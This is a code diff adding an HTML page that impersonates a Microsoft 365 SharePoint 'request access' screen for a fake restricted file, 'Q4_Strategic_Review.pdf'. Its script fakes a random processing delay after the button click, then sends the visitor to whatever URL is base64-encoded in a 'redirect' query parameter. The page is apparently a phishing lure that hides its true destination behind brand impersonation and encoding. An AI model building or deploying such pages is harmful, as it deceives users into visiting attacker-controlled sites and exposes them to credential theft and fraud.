@@ -1,0 +1,139 @@
+1|<!DOCTYPE html>
+2|<html lang="en">
+3|<head>
+4|<meta charset="UTF-8">
+5|<meta name="viewport" content="width=device-width, initial-scale=1.0">
+6|<title>Shared Document — Access Required</title>
+7|<style>
+8|  * { margin: 0; padding: 0; box-sizing: border-box; }
+9|  body { background: #fff; font-family: "Segoe UI", -apple-system, Roboto, "Helvetica Neue", sans-serif; color: #242424; }
+10|  
+11|  /* Microsoft header bar */
+12|  .ms-header { height: 48px; background: #fff; border-bottom: 1px solid #e1dfdd; display: flex; align-items: center; padding: 0 16px; gap: 16px; }
+13|  .ms-waffle { width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; cursor: default; }
+14|  .ms-waffle div { display: grid; grid-template-columns: repeat(3, 4px); gap: 3px; }
+15|  .ms-waffle span { display: block; width: 4px; height: 4px; background: #605e5c; border-radius: 1px; }
+16|  .ms-home { font-size: 14px; color: #242424; font-weight: 500; letter-spacing: -0.2px; cursor: default; }
+17|  .ms-separator { width: 1px; height: 24px; background: #e1dfdd; }
+18|  .ms-app { font-size: 14px; color: #0078d4; font-weight: 600; cursor: default; }
+19|  .ms-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+20|  .ms-avatar { width: 32px; height: 32px; border-radius: 50%; background: #0078d4; color: #fff; display: flex; align-items: center; justify-content: center; font-size: 13px; font-weight: 600; cursor: default; }
+21|
+22|  .container { max-width: 480px; margin: 0 auto; padding: 40px 24px; text-align: center; }
+23|
+24|  .logo-area { margin-bottom: 24px; }
+25|  .logo-area img { height: 36px; }
+26|
+27|  .lock-icon { 
+28|    width: 64px; height: 64px; margin: 0 auto 16px; 
+29|    background: #fdf8e2; border-radius: 50%; display: flex; align-items: center; justify-content: center;
+30|  }
+31|  .lock-icon svg { width: 32px; height: 32px; }
+32|
+33|  h1 { font-size: 20px; font-weight: 600; color: #242424; margin-bottom: 8px; letter-spacing: -0.4px; }
+34|  .subtitle { font-size: 14px; color: #605e5c; margin-bottom: 4px; line-height: 1.4; }
+35|
+36|  .doc-card { 
+37|    background: #faf9f8; border: 1px solid #edebe9; border-radius: 8px; 
+38|    padding: 20px; margin: 24px 0; text-align: left;
+39|  }
+40|  .doc-row { display: flex; justify-content: space-between; padding: 8px 0; font-size: 13px; }
+41|  .doc-row .label { color: #605e5c; }
+42|  .doc-row .value { color: #242424; font-weight: 500; text-align: right; }
+43|
+44|  .btn-request {
+45|    display: inline-block; width: 100%; padding: 12px 0; 
+46|    background: #0078d4; color: #fff; border: none; border-radius: 4px;
+47|    font-size: 15px; font-weight: 600; cursor: pointer; transition: background 0.15s;
+48|    letter-spacing: -0.2px; margin-bottom: 16px;
+49|  }
+50|  .btn-request:hover { background: #106ebe; }
+51|  .btn-request:active { background: #005a9e; }
+52|  .btn-request:disabled { background: #a0c5e8; cursor: wait; }
+53|
+54|  .footer-text { font-size: 12px; color: #a19f9d; margin-top: 8px; }
+55|  .footer-text span { color: #0078d4; cursor: default; }
+56|
+57|  .spinner { 
+58|    display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.3); 
+59|    border-top-color: #fff; border-radius: 50%; animation: spin 0.6s linear infinite; 
+60|    vertical-align: middle; margin-right: 6px; display: none;
+61|  }
+62|  @keyframes spin { to { transform: rotate(360deg); } }
+63|</style>
+64|</head>
+65|<body>
+66|
+67|<div class="ms-header">
+68|  <div class="ms-waffle"><div><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></div></div>
+69|  <div class="ms-home">Microsoft 365</div>
+70|  <div class="ms-separator"></div>
+71|  <div class="ms-app">SharePoint</div>
+72|  <div class="ms-right"><div class="ms-avatar">U</div></div>
+73|</div>
+74|
+75|<div class="container">
+76|  <div class="logo-area">
+77|    <img src="https://i.imgur.com/VRNNCcC.png" alt="logo" onerror="this.style.display='none'">
+78|  </div>
+79|
+80|  <div class="lock-icon">
+81|    <svg viewBox="0 0 24 24" fill="#ff8c00"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+82|  </div>
+83|
+84|  <h1>You need permission to access this file</h1>
+85|  <p class="subtitle">This document has been shared with your organization.</p>
+86|  <p class="subtitle">Request access to view it.</p>
+87|
+88|  <div class="doc-card">
+89|    <div class="doc-row"><span class="label">Document</span><span class="value">Q4_Strategic_Review.pdf</span></div>
+90|    <div class="doc-row"><span class="label">Shared by</span><span class="value">External Partner</span></div>
+91|    <div class="doc-row"><span class="label">Date shared</span><span class="value">July 2026</span></div>
+92|    <div class="doc-row"><span class="label">Access</span><span class="value" style="color:#d83b01;">Restricted</span></div>
+93|  </div>
+94|
+95|  <button class="btn-request" id="btnRequest" onclick="requestAccess()">
+96|    <span class="spinner" id="spinner"></span> Request Access
+97|  </button>
+98|
+99|  <div class="footer-text">
+100|    Signed in as <span id="userEmail">user@organization.com</span>
+101|  </div>
+102|  <div class="footer-text" style="margin-top:4px;">
+103|    <span>Switch account</span> &nbsp;·&nbsp; <span>Learn more</span>
+104|  </div>
+105|
+106|  <div style="margin-top:48px; padding-top:16px; border-top:1px solid #edebe9;">
+107|    <p style="font-size:11px; color:#a19f9d;">Microsoft SharePoint · Automated notification</p>
+108|  </div>
+109|</div>
+110|
+111|<script>
+112|function requestAccess(){
+113|  var btn = document.getElementById('btnRequest');
+114|  var sp = document.getElementById('spinner');
+115|  btn.disabled = true;
+116|  sp.style.display = 'inline-block';
+117|  btn.innerHTML = '<span style="display:inline-block;width:16px;height:16px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .6s linear infinite;vertical-align:middle;margin-right:6px;"></span> Requesting access...';
+118|
+119|  var delay = 2000 + Math.floor(Math.random() * 2000);
+120|
+121|  setTimeout(function(){
+122|    var params = new URLSearchParams(window.location.search);
+123|    var redirect = params.get('redirect');
+124|    if (redirect) {
+125|      try {
+126|        var decoded = atob(redirect);
+127|        if (decoded.indexOf('http') === 0) {
+128|          window.location.href = decoded;
+129|          return;
+130|        }
+131|      } catch(e) {}
+132|    }
+133|  }, delay);
+134|}
+135|</script>
+136|
+137|</body>
+138|</html>
+139|
